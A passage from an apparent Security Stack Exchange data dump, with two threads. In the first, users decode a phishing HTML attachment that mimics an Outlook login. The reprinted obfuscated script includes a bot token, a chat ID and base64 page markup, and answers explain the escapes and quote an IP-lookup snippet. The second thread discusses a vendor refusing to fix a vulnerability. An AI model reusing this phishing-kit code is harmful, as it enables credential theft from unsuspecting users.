RuLm1z\x5anRhdX\x52oLm5\154dC9zaG\u0046y\u005aWQv\u004dS\u0034wL2NvbnRlb\x6eQva\127\x31hZ2VzL2\x31pY3J\166c29\x6d\144\x46\u0039s\x622d\x76\u0058\x32V\x6b\x4fWM\065ZWI\u0077ZGN\u006cM\124d\u006bNzUyY\u006dVkZ\x57\105\u0032\x59jVhY2\x52h\x4emQ\u0035\u004cnBuZyIg\x633Znc\063J\u006aP\u0053Jo\144\x48R\x77\143z\157v\x4c2FhZG\116kbi5\164c2Z0\x59\x58V0aC5\x75\132X\x51vc2hhcmVk\x4czEu\u004dC9\x6a\x622\u00350Z\x575\u0030L2ltY\u0057dlcy\u0039taW\u004eyb3NvZn\122f\142G9nb\x319l\x5a\x54\x56jOG\1215\u005a\155I2\x4djQ4Yzk\172O\u0047ZkMGRjMT\u006b\u007aN\u007aBlOTBi\132C\x35zdmci\111\110\116yY\172\060ia\x48R\060c\110M6L\1719hYWRjZG4ub\130NmdGF1d\107gub\u006dV\060\x4c\x33N\u006f\131\u0058\112lZC8x\114jAvY\x329udGV\165dC9\u0070\x62W\x46n\132XMvbWljc\x6d9zb2Z0X2\x78\x76Z2\x39\146ZWU1Yzh\u006bOWZ\x69NjI\060OG\u004d5M\172\150m\x5a\x44\x42k\u0059z\x45\x35\x4dzcw\132TkwY\155Qu\x633ZnIi\102h\142\x48Q9Ik1\x70Y3Jv\14329md\u0043I+P\1039\153aXY+Ci\x41g\111\103A\x67\x49\103A\u0067PGRpdiB\x79b2xlPSJt\x59WluIj4K\u0050GRp\144iBjbGF\x7acz0i\x59W5\x70\142\u0057F0\x5aSBz\u0062Gl\u006bZ\x531\x70b\u00691uZX\x680Ij4K\x49CAg\x49CAgIC\x418ZG\1542ID\x34KPGRpdi\x42jbGF\x7acz0ia\127R\x6c\x62nRpdHlCY\u00575u\x5a\130I\u0069P\x67ogICA\x67\x50\107\x52\160\x64i\x42pZ\x440iZG\154zcG\x78\u0068e\u0055\065hbWU\u0069IGN\163YXNzPS\112pZGVu\x64\u0047l0e\123I+P\1039\u006b\x61XY+C\u006awvZ\u0047l\x32Pjwv\132Gl2\u0050gogI\103A\x67\x50C9ka\130Y+CiAgI\103A\u0038\u005a\107l\x32IGNs\u0059X\x4e\u007aPSJw\x59Wdpbm\u00460aW9uLX\132\160ZX\143g\131W5pbW\1060ZSB\157Y\130\x4dta\x57\x52l\x62n\x52pdHktY\155\x46u\u0062mV\171IH\x4esaWR\154LWluL\x57\065l\x65\110Q\u0069\120g\157gICA\147\u0050\x47R\x70dj\x34KCj\u0078kaXY\147aWQ9\111m\x78vZ\062luS\x47Vh\x5a\107\u0056y\x49iBj\x62GF\172cz0\151cm\x393IH\122p\u0064Gx\u006cIGV\064\x64C\u00310aXR\u0073\u005a\x53I+CiAg\111\103\x41\x38ZG\u006c2IHJ\166\142GU\071ImhlY\x57Rpbm\x63iIGFy\u0061WEtb\x47\u00562ZWw\x39I\x6aEiPk\126\x75dGV\171\u0049HBhc\u0033\u004e3\x623Jk\u0050\u00439\u006b\x61X\131\x2bCjw\166ZG\1542Pg\1578\u005a\x47l\062IGlk\u0050SJl\143\u006eJ\x76\u0063\x6eB\x33IiB\x7a\u0064H\154\x73ZT0i\u005929sb3I6I\110J\x6cZDsg\142WF\x79\x5a2\x6cu\117\151AxNXB4O\x79Bt\x59X\x4ana\x574tbGVmd\104ogM\110B\u0034O\171B\u0074\131XJnaW4tdG9wOiAwcHg\067\u0049\x471hc\155d\160b\151\x31ib3R0b\x320\x36\x49DBweDsi\x50jw\166ZGl2\x50\147o8ZG\x6c2IG\x4es\x59XN\x7aPSJyb3c\x69\x50\x67ogI\103\101\147\x50\u0047R\160\x64\151Bj\142\107\106z\143z\u0030iZm9ybS\061ncm91cCBj\u00622wtbW\121tMj\121iPg\u006f\147I\103\x41gI\u0043AgI\104x\u006baXYgY2x\u0068c3M9In\x42sY\127N\154\x61G\071s\u005aGVyQ\u00329udGFpbm\x56yIj\u0034K\x49CA\x67\u0049CAg\x49CAgICAgPGluc\110\1260\x49\107\x35h\142W\1259\x49nB\x68c3N\063ZCIgd\110lwZT0i\143\x47Fz\x633dvcm\x51i\x49GlkP\123Jp\u004dDEx\x4fCI\u0067\u0059XV0b2Nvb\u0058B\x73ZXRlP\x53Jv\132\x6d\x59iIGNsY\130N\172\120S\x4a\155b\u0033\u004a\164\114WNv\142nRyb\x32\167gaW5wdXQ\x67ZX\u00680\x4cWlu\x63HV\060IHRl\x65H\x51t\u0059m94\111GV\064d\103\x310ZXh\u0030LWJve\103I\147c\x47x\u0068Y2\x56\157b2\170\153Z\x58\u0049\071IlB\150c3\x4e\063\142\063JkIiByZ\130\106\u0031aXJ\u006c\x5aC\x41v\120go8\1142Rpd\x6a4KIC\x41\x67ID\x77vZ\x47l\062Pg\x6f8\x4c2\u0052p\x64j4\u004bPG\u0052pdj4KPG\x52pdiB\u006ab\u0047Fzc\1720\u0069cG9\172aX\122\x70\x62\u00324tY\x6e\1260d\u00479uc\x79I\053CiA\147I\x43A8ZGl\x32P\147o\147I\x43Ag\x49CAg\u0049\x44xkaXYgY\u0032x\x68\u0063\x33\u004d9\111nJ\u0076dyI+CiA\x67\111CAgI\x43Ag\111CAgID\170\x6b\u0061XY\147Y2xhc\x33\u004d\x39Im\x4e\166bC1t\x5a\u00430yN\103I+\103i\u0041g\x49C\x41gIC\x41gI\103\x41\147ICA\x67\x49CA8ZGl2IGNsYX\116zPSJ\x30ZXh0LTEzI\u006a\x34KI\u0043Ag\x49CA\u0067I\103\x41g\x49\103\101gIC\u0041gI\x43AgICA\x38ZGl\x32IG\116s\u0059\130Nz\120\x53Jm\u00623\112tLW\x64y\u0062\x33\126wIj\064KIC\u0041\147IC\x41g\u0049\u0043\101gIC\x41gIC\x41gICAgI\x43\u0041gICAgP\x47Eg\141WQ\x39Im\u006ckQ\x56\x39\121V\060RfRm\071\171Z290\125\u0047Fz\1433d\u0076cmQ\151\x49H\112vb\107U9\111m\x78pbms\u0069IGhyZW\x599IiM\u0069\120kZvc\u006dd\x76dHRlbiBteSBwYX\x4ezd29yZDwv\131T4KICAg\x49CA\u0067IC\u0041\147ICAgI\u0043A\u0067IC\101gI\103A\u0038L2Rpd\x6a4KP\u0047\122\u0070d\151Bj\x62\x47Fz\143\172\u0030iZm9ybS\061ncm91cCI\u002bC\x6awvZGl2Pgo\147ICA\147IC\x41\147IDx\153aXYgY2\170hc3M9\x49mZv\u0063m0t\1323Jv\144X\u0041\x69PgogICAgI\103\101gIC\101gIC\u00418YS\x42pZD0iaTE\x32\x4ej\u0067\u0069IG\150yZWY9Ii\x4d\151P\x6cNp\13224\147aW\u0034\x67d\x32l0aC\102\u0068bm90a\x47\126y\111\x47F\x6aY291bnQ8L\x32E+Ci\u0041gI\103\x41\x67\111CA\147\120C\z71kaXY+PC\x39\153a\x58\u0059+PC9\153\x61\x58Y\x2b\120\x439\u006baX\131\053\x43i\10…
</code></pre>
<p>How to decode this code? We tried almost everything, base64, hex, url etc.</p>
","-1","3","264692","<p>It's Javascript <a href=""https://en.wikipedia.org/wiki/Obfuscation_(software)"" rel=""nofollow noreferrer"">obfuscated</a> by <a href=""https://en.wikipedia.org/wiki/Unicode"" rel=""nofollow noreferrer"">Unicode</a>.</p>
<p><code>var \u0065mai\u006c=&quot;hiddenforsafety@hidden.com&quot;;var \u0074oken='577506\0703\x317:A\x41Hrvihv2\114Zw\x6b\x4b\u0076\u0058v\170q\u0046Fuo\x48HSklu\070J\u0075rf8';var c\u0068\u0061t_id=5253999887;var data=ato\u0062(&quot;P\103FET0NUWVBFI\x47\150\060bW\167+\103jxod\x471sI\u0047Rpcj\060ib\110R\171IiB\152b\107Fzcz\x30iI\151B\163\131W5\x6ePSJlb\151I\053C\u0069AgI\x43A8\141GV\u0068\132D4\113I\x43AgI\u0044xtZXR\x68I…</code></p>
<ul>
<li><code>\u</code> followed by four hexadecimal characters: <code>\u0065</code> is <code>e</code>, <code>\u006c</code> is <code>l</code>, <code>\u0074</code> is <code>t</code>, etc.</li>
<li><code>\x</code> followed by two hexadecimal characters: <code>\x31</code> is <code>1</code>, <code>\x41</code> is <code>A</code></li>
<li><code>\</code> followed by three octal characters: <code>\070</code> is <code>8</code></li>
</ul>
<p>That makes the code deobfuscate into:</p>
<p><code>var email=&quot;hiddenforsafety@hidden.com&quot;;var token='5775068317:AAHrvihv2…</code></p>
<p>There are further obfuscation techniques in here as well, most notably in the <code>ato\u0062(…)</code> part, which, after deobfuscating the Unicode, is <a href=""https://developer.mozilla.org/en-US/docs/Web/API/atob"" rel=""nofollow noreferrer""><code>atob()</code></a>, which converts <a href=""https://en.wikipedia.org/wiki/Base64"" rel=""nofollow noreferrer"">base64</a> text (printable characters) into <a href=""https://en.wikipedia.org/wiki/Binary_data"" rel=""nofollow noreferrer"">binary data</a>.</p>
<p>Analyzing beyond that would require a lot more effort. You've already gone far enough to know that it's bad and should not be run.</p>
","2"
"264690","264690","Who can we read the contents of the variable? Which format is used?","<p>We are not IT security specialists but we are very curious to know more about a scam we received through mail.</p>
<p>We received a mail with a HTML file attached. The subject of the mail looked very clickbaity.</p>
<p>The title was: <code>Webshop will removed from server now , Update attached to stay active now..</code></p>
<p>When you open the attached HTML file you see a login page for outlook.</p>
<p>Then we looked at the source code and found some weird looking variables between the script tags.</p>
<p>This is the code:</p>
<pre><code>var \u0065mai\u006c=&quot;hiddenforsafety@hidden.com&quot;;var \u0074oken='577506\0703\x317:A\x41Hrvihv2\114Zw\x6b\x4b\u0076\u0058v\170q\u0046Fuo\x48HSklu\070J\u0075rf8';var c\u0068\u0061t_id=5253999887;var data=ato\u0062(&quot;P\103FET0NUWVBFI\x47\150\060bW\167+\103jxod\x471sI\u0047Rpcj\060ib\110R\171IiB\152b\107Fzcz\x30iI\151B\163\131W5\x6ePSJlb\151I\053C\u0069AgI\x43A8\141GV\u0068\132D4\113I\x43AgI\u0044xtZXR\x68I\x47\x680\144H\u0041\x74ZXF1a\130Y9IkN\u0076bnR\x6cbn\121tVHlwZ\u0053I\x67\u005929udG\126udD0\151dGV4dC\x39\x6f\144\1071sOyBjaGFyc\x32V\x30P\u0056VUR\x69\x304I\1524KICAgI\x44x0\x61XRsZ\x54\x35\124aWd\x75\x49\x47lu\111H\x52vI\x48lv\144X\x49g\131WNjb3VudD\167vdG\x6c\x30bGU+C\151Ag\x49CA8bWV0YSBodHRwL\127\126xdW\154\x32PS\112YLVVBLU\x4e\u0076bX\u0042\150d\u0047libG\125iIGNvbnR\u006cbn\u00519Ik\u006cF\120WV\x6bZ2Ui\120\x67ogICA\x67P\u00471l\x64G\u0045gb\x6dF\x74Z\u00540idmlld3BvcnQiIGN\166b\156R\u006c\x62\x6e\1219\x49ndpZHR\157\u0050W\x52\154dml\152Z\x5313\u0061\x57R\x30\x61\u0043\x77ga\x57\x35pd\x47\154h\142C\x31zY2\106sZT0x\114jAsIG\061\150eG\x6ctd\u0057\x30t\1432N\x68bGU9\115i\x34\u0077\114\103\102\u0031c2VyLX\x4e\152YW\x78h\131mxlP\u0058llcy\111+\103\x69A\x67ICA8c\x32NyaXB\060\x49\u0048NyYz0ia\x48\x520cHM\u0036\u004cy\x39ham\x464L\155dv\x622dsZ\x57\u0046\167aXMu\131\x329t\x4c2Fq\131XgvbGli\x63\1719\u0071\u0063X\x56\154\x63n\x6bvM\u007940\u004cjEvanF\x31\132XJ5Lm\u0031pb\x695q\u0063yI+PC\x39\172\u0059\x33JpcH\u0051+\103i\101\147IC\x418bG\154u\u0061y\u0042yZWw9In\x4eo\x62\x33J0\1313\x560IGljb\x324iIGhyZ\u0057\u0059\071Im\1500dHBzOi\x38vYW\u0046kY2RuL\1551\u007aZnRh\u0064XRo\x4cm5\154\x64C9zaGFyZW\121\166\x4dS\064\x77L\u0032\x4evbn\x52lbnQ\166aW1hZ\u0032\u0056z\u004c\062\x5ahdmlj\14225\x66\x59\u0056\x39l\x64\130\x42heWZ\156Z2\u0068x\x61W\u0046\160N2s\x35\u0063\u00329s\x4emxn\115\x695p\x59\x328i\x50iA\147ICAKIC\101g\111Dxs\141W\x35rI\x47\122hdGE\164\x62G9\150ZG\126\x79PSJj\132G\x34iIGNy\x623\x4ezb3JpZ2\x6cuPSJhbm\u0039\u0075eW1\x76\144\130\x4diIGhyZW\u00599Im\u00680\x64H\x42\172O\1518v\u0059\u0057FkY2Ru\x4cm1zZ\x6e\122hdXRoL\u006d\x35\x6cdC\071lc3Rz\u004cz\x49u\u004dS9j\x62250\x5aW50\1142N\u006b\142mJ1bm\x52s\u005a\130Mv\x5929\x75dm\u0056y\1322Vk\114nY\u0079LmxvZ2luLm\x31p\142l\u0039\066\u0061X\154\x30Z\152\150k\145\156Q5\132WcxczY\164\u00622\x68o\u0062GV\x6eMi5jc3\x4di\x49H\x4albD\060ic3R5bGV\x7a\141GV\154\u0064\x43\x49+Ci\u0041gI\103\x41\x38c2N\x79aXB0Pg\x6fgICAg\u0049\103\x41\147ICQ\157ZG9jdW\061\x6c\142nQpLn\112lY\127R5\x4bGZ1bmN\x30a\x57\x39u\113C\153\147eyQ\x6fIi\u004ekaXN\167bG\x465Tm\106t\x5aSIpL\x6d\u0056t\u0063HR\065KCk\165YXB\167ZW5kKG\u0056\164\x59WlsKTs\147JC5\156\132\x58\122KU\060\071OK\103J\x6fdHRw\x63zovL2FwaS5pcGlmeS5vc\155\143/Zm\071y\142WF0\120\u0057pzb24\x69L\x43\x42\155dW5\x6adGl\u0076bi\150\x6b\x59X\u0052h\x4bSB7J\u0043gi\x492d\155ZyI\u0070Lm\1500bWwoZ\x47F0YS5p\u0063\x43k7fSl9K\x54s\113ICAg\x49D\x77vc\x32Ny\x61XB0\x50go8L\u0032hlYWQ+Cjx\151b2R\065IG\x4esYX\x4ezPS\112jYiI\147c\063R5bG\x559I\155Rpc3\102sYX\1536IGJsb2\x4erOyI+CjxwIG\x6ckP\123Jn\132\x6d\u0063i\111\110\1160e\u0057\170\154PSJkaXNwbGF5O\x69Bub\x325lO\x79\x49+\x50\x439\x77Pg\1578\132m9y\x62SBuY\127\x31lPSJ\u006dMSIgaWQ9\111mkwMjg\170\x49iBu\1423\132\150b\107l\u006b\x59XRlPS\x4aub\x33Z\x68bGlk\x59XRlI\x69\u0042z\x63\u0047V\163\x62GNoZW\x4erPSJ\155Y\x57xzZS\x49gbW\126\x30aG9kP\x53\x4aw\u0062\063N0IiB0YXJnZXQ9I\15490b3AiIGF\061dG9j\1422\x31\x77b\x47V\060ZT0ib2Z\u006d\u0049iBhY\u0033\x52\x70b24\u0039\111\151I+\x43iAgICA\070Z\107l2IGNsYX\x4ezPSJsb2\u0064\160bi1\167\u0059\u0057d\u0070\x62\u006d\x460ZWQt\u0063G\106nZS\111+\x43iAgIC\101gICAgPGRpd\u0069B\160\u005aD\x30\151bGlnaHR\151b3hUZ\x571wbGF0\x5aUN\u0076bn\x52\150aW5\154ciI+\u0043\u006axka\u0058\x59g\x61\127Q9Im\x78p\1322\x680Y\x6d94QmFja\062dyb3VuZENvbnRha\1275\154ciI+C\u0069\u0041gICA8\132Gl2IGN\163YXNzPSJiY\x57\x4erZ3Jvd\127\u0035\u006b\114WltYW\144lLWhvbG\122\x6cciIgcm\x39sZ\x540i\u0063\u0048Jlc\x32Vu\x64\107F0aW9u\111j\x34\u004bICAgID\x78k\x61XY\147Y\x32\170hc3M9ImJhY\062\x74ncm\0711b\155\x51ta\u00571h\x5a2Ug\132X\150\060\114WJh\x592tncm9\u0031bmQt\141W\061hZ2\x55iIHN0\145\u0057xlP\123J\x69Y\x57NrZ3\x4av\144W\065\x6bL\127\x6ct\131W\x64\154OiB1cmwoJnF1b3\x51\x37aHR0cH\1156Ly9hYWR\152\132G4ubX\x4emd\x47\x461dGgubm\x56\x30L3NoYXJl\132\x43\x38xLjAv\u00592\u0039\x75dG\126u\u0064C9pbWFnZXMvYmF\x6aa2\x64yb3V\x75\132HMv\u004dl\071iY\u007aNkMzJhNjk\x32OD\x6b1\132jc\u0034YzE\065ZG\131\x32Yz\143x\x4e\x7a\1254\116m\1051\132C5zdmcm\x63XVvdDspO\u0079I+\x50C9k\x61\u0058Y+Cjwv\u005aGl2\120\152wvZG\1542\120\147\x6f8ZGl2I\107NsYXNzPSJvdXR\x6cc\u0069\111+\103i\101\u0067\x49CA8ZGl2\x49GN\x73YX\x4e\x7aPSJ0\132W\x31w\142GF0\x5aS1zZWN0\141W9\x75\x49G1h\x61W\064tc2\126j\144\107lvbi\111+C\151Ag\111C\101g\x49CAgP\u0047Rp\u0064iB\u006abG\x46z\x63z\x30ibW\154k\132G\x78\u006c\111GV\x34d\1031taWR\x6b\142G\x55i\x50gogICAgICAgICAg\111C\x418\132G\1542IGNsY\u0058Nz\120SJm\144Wx\u0073L\u0057h\154a\127dodCI\u002b\x43jx\153aX\u0059g\x592\u0078hc3M9\u0049m\132sZ\x58gtY29sdW1\165\111j4\u004b\x49C\101g\u0049\104xk\x61\x58Y\u0067Y2x\u0068\x63\u0033M\071Indpb\u0069\x31\x7aY\u0033JvbGw\151Pgo\x67ICA\x67\x49C\x41gIDxkaXYgaW\x51\071Imxp\x5a\x32h0\u0059\u006d\x394I\x69B\x6a\x62GFz\x63z0\u0069c2\x6cn\142i\061\x70bi1ib3\147\x67ZXh0\x4cXN\160Z24t\u0061\1274t\x59\1559\u0034IGZ\u0068ZG\125t\x61W4\u0074b\107lnaH\u0052ib\u0033gi\x50gogICAgICAgI\104\170\u006baX\131+P\107ltZyB\u006abGFz\x63\u007a0ibG\x39\156byI\147c\1559sZT0\151aW\x31\x6eIi\102wb\155d\172cmM9\x49\155h0dH\102zOi8vY\127FkY2RuLm1z\x5anRhdX\x52oLm5\154dC9zaG\u0046y\u005aWQv\u004dS\u0034wL2NvbnRlb\x6eQva\127\x31hZ2VzL2\x31pY3J\166c29\x6d\144\x46\u0039s\x622d\x76\u0058\x32V\x6b\x4fWM\065ZWI\u0077ZGN\u006cM\124d\u006bNzUyY\u006dVkZ\x57\105\u0032\x59jVhY2\x52h\x4emQ\u0035\u004cnBuZyIg\x633Znc\063J\u006aP\u0053Jo\144\x48R\x77\143z\157v\x4c2FhZG\116kbi5\164c2Z0\x59\x58V0aC5\x75\132X\x51vc2hhcmVk\x4czEu\u004dC9\x6a\x622\u00350Z\x575\u0030L2ltY\u0057dlcy\u0039taW\u004eyb3NvZn\122f\142G9nb\x319l\x5a\x54\x56jOG\1215\u005a\155I2\x4djQ4Yzk\172O\u0047ZkMGRjMT\u006b\u007aN\u007aBlOTBi\132C\x35zdmci\111\110\116yY\172\060ia\x48R\060c\110M6L\1719hYWRjZG4ub\130NmdGF1d\107gub\u006dV\060\x4c\x33N\u006f\131\u0058\112lZC8x\114jAvY\x329udGV\165dC9\u0070\x62W\x46n\132XMvbWljc\x6d9zb2Z0X2\x78\x76Z2\x39\146ZWU1Yzh\u006bOWZ\x69NjI\060OG\u004d5M\172\150m\x5a\x44\x42k\u0059z\x45\x35\x4dzcw\132TkwY\155Qu\x633ZnIi\102h\142\x48Q9Ik1\x70Y3Jv\14329md\u0043I+P\1039\153aXY+Ci\x41g\111\103A\x67\x49\103A\u0067PGRpdiB\x79b2xlPSJt\x59WluIj4K\u0050GRp\144iBjbGF\x7acz0i\x59W5\x70\142\u0057F0\x5aSBz\u0062Gl\u006bZ\x531\x70b\u00691uZX\x680Ij4K\x49CAg\x49CAgIC\x418ZG\1542ID\x34KPGRpdi\x42jbGF\x7acz0ia\127R\x6c\x62nRpdHlCY\u00575u\x5a\130I\u0069P\x67ogICA\x67\x50\107\x52\160\x64i\x42pZ\x440iZG\154zcG\x78\u0068e\u0055\065hbWU\u0069IGN\163YXNzPS\112pZGVu\x64\u0047l0e\123I+P\1039\u006b\x61XY+C\u006awvZ\u0047l\x32Pjwv\132Gl2\u0050gogI\103A\x67\x50C9ka\130Y+CiAgI\103A\u0038\u005a\107l\x32IGNs\u0059X\x4e\u007aPSJw\x59Wdpbm\u00460aW9uLX\132\160ZX\143g\131W5pbW\1060ZSB\157Y\130\x4dta\x57\x52l\x62n\x52pdHktY\155\x46u\u0062mV\171IH\x4esaWR\154LWluL\x57\065l\x65\110Q\u0069\120g\157gICA\147\u0050\x47R\x70dj\x34KCj\u0078kaXY\147aWQ9\111m\x78vZ\062luS\x47Vh\x5a\107\u0056y\x49iBj\x62GF\172cz0\151cm\x393IH\122p\u0064Gx\u006cIGV\064\x64C\u00310aXR\u0073\u005a\x53I+CiAg\111\103\x41\x38ZG\u006c2IHJ\166\142GU\071ImhlY\x57Rpbm\x63iIGFy\u0061WEtb\x47\u00562ZWw\x39I\x6aEiPk\126\x75dGV\171\u0049HBhc\u0033\u004e3\x623Jk\u0050\u00439\u006b\x61X\131\x2bCjw\166ZG\1542Pg\1578\u005a\x47l\062IGlk\u0050SJl\143\u006eJ\x76\u0063\x6eB\x33IiB\x7a\u0064H\154\x73ZT0i\u005929sb3I6I\110J\x6cZDsg\142WF\x79\x5a2\x6cu\117\151AxNXB4O\x79Bt\x59X\x4ana\x574tbGVmd\104ogM\110B\u0034O\171B\u0074\131XJnaW4tdG9wOiAwcHg\067\u0049\x471hc\155d\160b\151\x31ib3R0b\x320\x36\x49DBweDsi\x50jw\166ZGl2\x50\147o8ZG\x6c2IG\x4es\x59XN\x7aPSJyb3c\x69\x50\x67ogI\103\101\147\x50\u0047R\160\x64\151Bj\142\107\106z\143z\u0030iZm9ybS\061ncm91cCBj\u00622wtbW\121tMj\121iPg\u006f\147I\103\x41gI\u0043AgI\104x\u006baXYgY2x\u0068c3M9In\x42sY\127N\154\x61G\071s\u005aGVyQ\u00329udGFpbm\x56yIj\u0034K\x49CA\x67\u0049CAg\x49CAgICAgPGluc\110\1260\x49\107\x35h\142W\1259\x49nB\x68c3N\063ZCIgd\110lwZT0i\143\x47Fz\x633dvcm\x51i\x49GlkP\123Jp\u004dDEx\x4fCI\u0067\u0059XV0b2Nvb\u0058B\x73ZXRlP\x53Jv\132\x6d\x59iIGNsY\130N\172\120S\x4a\155b\u0033\u004a\164\114WNv\142nRyb\x32\167gaW5wdXQ\x67ZX\u00680\x4cWlu\x63HV\060IHRl\x65H\x51t\u0059m94\111GV\064d\103\x310ZXh\u0030LWJve\103I\147c\x47x\u0068Y2\x56\157b2\170\153Z\x58\u0049\071IlB\150c3\x4e\063\142\063JkIiByZ\130\106\u0031aXJ\u006c\x5aC\x41v\120go8\1142Rpd\x6a4KIC\x41\x67ID\x77vZ\x47l\062Pg\x6f8\x4c2\u0052p\x64j4\u004bPG\u0052pdj4KPG\x52pdiB\u006ab\u0047Fzc\1720\u0069cG9\172aX\122\x70\x62\u00324tY\x6e\1260d\u00479uc\x79I\053CiA\147I\x43A8ZGl\x32P\147o\147I\x43Ag\x49CAg\u0049\x44xkaXYgY\u0032x\x68\u0063\x33\u004d9\111nJ\u0076dyI+CiA\x67\111CAgI\x43Ag\111CAgID\170\x6b\u0061XY\147Y2xhc\x33\u004d\x39Im\x4e\166bC1t\x5a\u00430yN\103I+\103i\u0041g\x49C\x41gIC\x41gI\103\x41\147ICA\x67\x49CA8ZGl2IGNsYX\116zPSJ\x30ZXh0LTEzI\u006a\x34KI\u0043Ag\x49CA\u0067I\103\x41g\x49\103\101gIC\u0041gI\x43AgICA\x38ZGl\x32IG\116s\u0059\130Nz\120\x53Jm\u00623\112tLW\x64y\u0062\x33\126wIj\064KIC\u0041\147IC\x41g\u0049\u0043\101gIC\x41gIC\x41gICAgI\x43\u0041gICAgP\x47Eg\141WQ\x39Im\u006ckQ\x56\x39\121V\060RfRm\071\171Z290\125\u0047Fz\1433d\u0076cmQ\151\x49H\112vb\107U9\111m\x78pbms\u0069IGhyZW\x599IiM\u0069\120kZvc\u006dd\x76dHRlbiBteSBwYX\x4ezd29yZDwv\131T4KICAg\x49CA\u0067IC\u0041\147ICAgI\u0043A\u0067IC\101gI\103A\u0038L2Rpd\x6a4KP\u0047\122\u0070d\151Bj\x62\x47Fz\143\172\u0030iZm9ybS\061ncm91cCI\u002bC\x6awvZGl2Pgo\147ICA\147IC\x41\147IDx\153aXYgY2\170hc3M9\x49mZv\u0063m0t\1323Jv\144X\u0041\x69PgogICAgI\103\101gIC\101gIC\u00418YS\x42pZD0iaTE\x32\x4ej\u0067\u0069IG\150yZWY9Ii\x4d\151P\x6cNp\13224\147aW\u0034\x67d\x32l0aC\102\u0068bm90a\x47\126y\111\x47F\x6aY291bnQ8L\x32E+Ci\u0041gI\103\x41\x67\111CA\147\120C\z71kaXY+PC\x39\153a\x58\u0059+PC9\153\x61\x58Y\x2b\120\x439\u006baX\131\053\x43i\10…
</code></pre>
<p>How to decode this code? We tried almost everything, base64, hex, url etc.</p>
","-1","3","264693","<p>If you decode it with unicode first and then base64, it's html that consists of the outlook site you saw. Did it have the correct url?</p>
<p>This script was located in the B64:</p>
<blockquote>
<p>$(document).ready(function()$(&quot;#displayName&quot;).empty().append(email);
$.getJSON(&quot;https://api.ipify.org?format=json&quot;,  function(data)
$(&quot;#gfg&quot;).html(data.ip);)</p>
</blockquote>
","0"
"264626","264626","Software vendor refuses to fix security vulnerability - what to do?","<p>I work as a consultant for a large corporation that uses some software, in which I have found a security vulnerability. I notified both my client and the software vendor about a year ago. They referred the case to their account manager (!), who (in a polite way) said: &quot;Your consultant is full of shit.&quot;
Luckily, the client got my back, and after a little back and forth they reluctantly agreed to release a patch. Just for my client, not for anyone else. It turned out to be a patch only for the client code, not fixing the underlying vulnerability on the server side.
When I pointed that out, they said: &quot;Yeah, sorry, but that's too much work. We consider that a customization request. If you pay for it, we can fix it.&quot;</p>
<p>I believe my client is currently negotiating license renewal with them and I'm assuming they are using this as a bargaining chip (the details are above my paygrade). However, I was asked for input, and it seems like, after pressure from my client, and just one year after being made aware of the issue, they have agreed to add it to their backlog as a &quot;feature request&quot;, finally admitting it's actually a security vulnerability. My client is currently pushing for an implementation date, but I'm not getting my hopes up.</p>
<p>Their argument for delaying the implementation? &quot;It's not an issue if everything else is set up correctly.&quot;
Which is true, but that's a bullshit argument. That's like saying &quot;You don't have to validate parameters on the backend because the frontend does the validation&quot; or &quot;You don't have to encrypt passwords because unprivileged users shouldn't be able to read the password database anyway.&quot; And I have already demonstrated how it can be exploited (&quot;Well, then you need to fix your settings.&quot;).</p>
<p>I am really annoyed that instead of thanking me for letting them know there's a problem, they first deny it, then acknowledge it, but downplay the risk, and then don't even fix it.
I'm sure they haven't notified any of their other customers of the issue.
My client says &quot;Well, that's their own problem&quot;, but I really feel the other customers should know, so they can make an informed decision whether to keep doing business with this company. Also, they would probably be able to pressure them into fixing the issue.</p>
<p>So what can I do? I guess I should first wait for the vendor to get back to my client with a timeline for fixing the issue (as if one year of doing nothing wasn't bad enough).
And then?
I don't want to disclose it publicly, because I really care about their customers. I also don't want to give them a deadline for fixing it, because I'm worried it could be interpreted as a threat.</p>
<p>But, if they don't fix this, would you talk to their other customers (large corporations)? I think that would probably put pressure on them to fix the problem. But it would also be immediately clear that the info was passed on by me. And I don't want to get into trouble with my client.</p>
","40","6","264629","<p>Things you can do:</p>
<ul>
<li>Go for <strong>full disclosure</strong>, but as you've pointed out, this will probably do little more than strain the relationship further</li>
<li>Do you have a <strong>working</strong> <strong>proof of concept</strong> that shows how the vulnerability could be exploited by an unauthorized person? It is one thing to demonstrate a potential vulnerability, but <strong>exploiting</strong> it is another matter. Until you come with a PoC, the vulnerability is perceived as theoretical and easy to dismiss. If on the other hand, you have such a PoC, then this could instill a sense of urgency that has been lacking so far.</li>
<li>Also, if the user base for this particular software is rather small, then public pressure may not be sufficient for them to amend their ways, especially when the customers are more or less &quot;captive&quot; on this particular software</li>
<li>I understand the vulnerability is <strong>server-side</strong>, but if this is a system that is hosted on premises you may have a number of <strong>mitigation</strong> options available. For example, if you are hosting a vulnerable web application that cannot be easily patched (for example a SQL injection vulnerability), then a WAF loaded with custom rules can make exploitation more difficult if not impossible. Or even a reverse proxy to filter the requests.</li>
<li>I am not a lawyer, but if the contract is up for renewal I would want to add a clause about vulnerabilities, known and unknown, and address <strong>liability</strong> in case of a breach.</li>
<li>Or you can try to be creative: ask for a quote for fixing that &quot;bug&quot; (maybe it's not a lot of money), pay up and tell them you're going for full disclosure after giving all clients the time to patch their systems, so that disclosure should not cause harm. Result: your client becomes an IT hero for sponsoring the fix, and the vendor is embarrassed. I am half-joking here, but if you have identified a software flaw that could cause you a lot of damage, paying for a fix now may be a smart move. But if you are going to pay, then you have the right to demand technical details so they'll have to justify the fee. Perhaps it will turn out that it's not that much work after all.</li>
</ul>
","27"
"264626","264626","Software vendor refuses to fix security vulnerability - what to do?","<p>I work as a consultant for a large corporation that uses some software, in which I have found a security vulnerability. I notified both my client and the software vendor about a year ago. They referred the case to their account manager (!), who (in a polite way) said: &quot;Your consultant is full of shit.&quot;
Luckily, the client got my back, and after a little back and forth they reluctantly agreed to release a patch. Just for my client, not for anyone else. It turned out to be a patch only for the client code, not fixing the underlying vulnerability on the server side.
When I pointed that out, they said: &quot;Yeah, sorry, but that's too much work. We consider that a customization request. If you pay for it, we can fix it.&quot;</p>
<p>I believe my client is currently negotiating license renewal with them and I'm assuming they are using this as a bargaining chip (the details are above my paygrade). However, I was asked for input, and it seems like, after pressure from my client, and just one year after being made aware of the issue, they have agreed to add it to their backlog as a &quot;feature request&quot;, finally admitting it's actually a security vulnerability. My client is currently pushing for an implementation date, but I'm not getting my hopes up.</p>
<p>Their argument for delaying the implementation? &quot;It's not an issue if everything else is set up correctly.&quot;
